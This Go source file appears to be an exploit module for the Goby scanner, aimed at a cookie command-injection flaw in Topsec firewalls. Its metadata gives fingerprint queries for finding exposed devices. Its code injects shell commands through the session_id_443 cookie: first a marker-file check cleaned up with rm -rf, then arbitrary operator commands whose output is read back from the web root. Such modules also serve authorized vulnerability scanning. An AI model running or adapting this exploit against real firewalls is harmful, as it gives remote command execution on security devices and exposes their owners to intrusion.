package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Topsec Firewall Cookie RCE",
    "Description": "Topsec Firewall Cookie RCE. \nSome command may not successfully execute, eg: cat /etc/passwd",
    "Impact": "Topsec Firewall Cookie RCE",
    "Recommendation": "<p>1. The vulnerability has been fixed by the official website, please go to the \"Download Center\" in the official website to download the corresponding patch to fix the vulnerability or upgrade the firmware: <a href=\"http://www.topsec.com.cn\">http://www.topsec.com.cn</a></p><p>2. If it is not necessary, prohibit public network access to the system.</p>",
    "Product": "TOPSEC-Product",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "天融信防火墙 Cookie 参数命令执行漏洞",
            "Description": "<p>天融信防火墙是一款综合的防火墙管理设备。</p><p>天融信防火墙 3.3.005.057.1 - 3.3.010.024.1版本 cookie参数存在任意命令执行漏洞，攻击者可获取服务器权限。</p>",
            "Impact": "<p>天融信防火墙 3.3.005.057.1 - 3.3.010.024.1版本 cookie参数存在任意命令执行漏洞，攻击者可获取服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.topsec.com.cn\">https://www.topsec.com.cn</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "TOPSEC firewall",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Topsec Firewall Cookie RCE",
            "Description": "Topsec Firewall Cookie RCE. \nSome command may not successfully execute, eg: cat /etc/passwd",
            "Impact": "Topsec Firewall Cookie RCE",
            "Recommendation": "<p>1. The vulnerability has been fixed by the official website, please go to the \"Download Center\" in the official website to download the corresponding patch to fix the vulnerability or upgrade the firmware: <a href=\"http://www.topsec.com.cn\">http://www.topsec.com.cn</a></p><p>2. If it is not necessary, prohibit public network access to the system.</p>",
            "Product": "TOPSEC-Product",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"/cgi/maincgi.cgi?Url=VerifyCode\"&&title=\"Web User Login\"",
    "GobyQuery": "body=\"/cgi/maincgi.cgi?Url=VerifyCode\"&&title=\"Web User Login\"",
    "Author": "atdpa4sw0rd@gmail.com",
    "Homepage": "htt[s://www.topsec.com.cn",
    "DisclosureDate": "2021-06-07",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "ls /www",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10755"
}`

	flagFile := goutils.RandomHexString(8)

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewGetRequestConfig("/cgi/maincgi.cgi?Url=aa")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Cookie", "session_id_443=1|echo \""+flagFile+"\">/www/htdocs/site/image/"+flagFile+";")
			cfg.FollowRedirect = false
			cfg.VerifyTls = false
			resp, _ := httpclient.DoHttpRequest(u, cfg)
			if resp.StatusCode != 200 {
				return false
			}
			cfgGet := httpclient.NewGetRequestConfig("/site/image/" + flagFile)
			cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGet.FollowRedirect = false
			cfgGet.VerifyTls = false
			respGet, errGet := httpclient.DoHttpRequest(u, cfgGet)
			cfgRm := httpclient.NewGetRequestConfig("/cgi/maincgi.cgi?Url=aa")
			cfgRm.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgRm.Header.Store("Cookie", "session_id_443=1|rm -rf /www/htdocs/site/image/"+flagFile+";")
			cfgRm.FollowRedirect = false
			cfgRm.VerifyTls = false
			httpclient.DoHttpRequest(u, cfgRm)
			if errGet == nil {
				return respGet.StatusCode == 200 && strings.Contains(respGet.Utf8Html, flagFile)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			cfg := httpclient.NewGetRequestConfig("/cgi/maincgi.cgi?Url=aa")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Cookie", fmt.Sprintf("session_id_443=1|%s > /www/htdocs/site/image/%s;", cmd, flagFile))
			cfg.FollowRedirect = false
			cfg.VerifyTls = false
			resp, _ := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if resp.StatusCode != 200 {
				expResult.Success = false
				expResult.Output = "the Target Maybe Not Vulnerability!\nPlease try again or Check the target"
				return expResult
			}
			cfgGet := httpclient.NewGetRequestConfig("/site/image/" + flagFile)
			cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGet.FollowRedirect = false
			cfgGet.VerifyTls = false
			respGet, errGet := httpclient.DoHttpRequest(expResult.HostInfo, cfgGet)
			cfgRm := httpclient.NewGetRequestConfig("/cgi/maincgi.cgi?Url=aa")
			cfgRm.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgRm.Header.Store("Cookie", "session_id_443=1|rm -rf /www/htdocs/site/image/"+flagFile+";")
			cfgRm.FollowRedirect = false
			cfgRm.VerifyTls = false
			httpclient.DoHttpRequest(expResult.HostInfo, cfgRm)
			if errGet == nil {
				expResult.Success = true
				expResult.Output = respGet.Utf8Html
			}
			return expResult
		},
	))
}
